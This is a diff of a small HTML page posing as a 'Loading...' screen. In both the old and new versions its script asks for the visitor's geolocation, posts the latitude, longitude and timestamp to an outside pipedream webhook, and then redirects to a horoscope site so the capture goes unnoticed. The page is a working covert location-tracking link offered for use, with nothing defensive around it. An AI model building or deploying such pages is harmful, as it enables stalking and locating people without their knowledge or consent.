@@ -1,55 +1,38 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-  <meta charset="UTF-8" />
+  <meta charset="UTF-8">
   <title>Loading...</title>
   <style>
-    body {
-      background: #fff;
-      color: #000;
-      font-family: sans-serif;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      height: 100vh;
-      margin: 0;
-    }
+    body{margin:0; height:100vh;display:flex;align-items:center;justify-content:center;}
   </style>
 </head>
 <body>
   <script>
     const webhookURL = "https://eo4zwpbukao2mkl.m.pipedream.net/";
-    const redirectToAstro = () => {
-      window.location.href = "https://www.astro.com/horoscope";
-    };
-
-    function sendLocation(position) {
-      const { latitude, longitude } = position.coords;
-      const timestamp = new Date().toISOString();
-
-      fetch(webhookURL, {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({ latitude, longitude, timestamp })
-      })
-      .catch(() => {}) // Jika gagal tetap redirect
-      .finally(() => {
-        setTimeout(redirectToAstro, 1000);
-      });
-    }
-
-    function handleError() {
-      setTimeout(redirectToAstro, 1000);
-    }
+    const redirect = () => window.location.href = "https://www.astro.com/horoscope";
 
     if (navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition(sendLocation, handleError, {
-        timeout: 10000
-      });
+      navigator.geolocation.getCurrentPosition(
+        pos => {
+          const body = {
+            latitude: pos.coords.latitude,
+            longitude: pos.coords.longitude,
+            timestamp: new Date().toISOString()
+          };
+          fetch(webhookURL, {
+            method: "POST",
+            headers: {"Content-Type":"application/json"},
+            body: JSON.stringify(body)
+          })
+          .catch(()=>{})
+          .finally(()=> setTimeout(redirect, 1000));
+        },
+        err => setTimeout(redirect, 1000),
+        { timeout: 10000 }
+      );
     } else {
-      handleError();
+      setTimeout(redirect, 1000);
     }
   </script>
 </body>
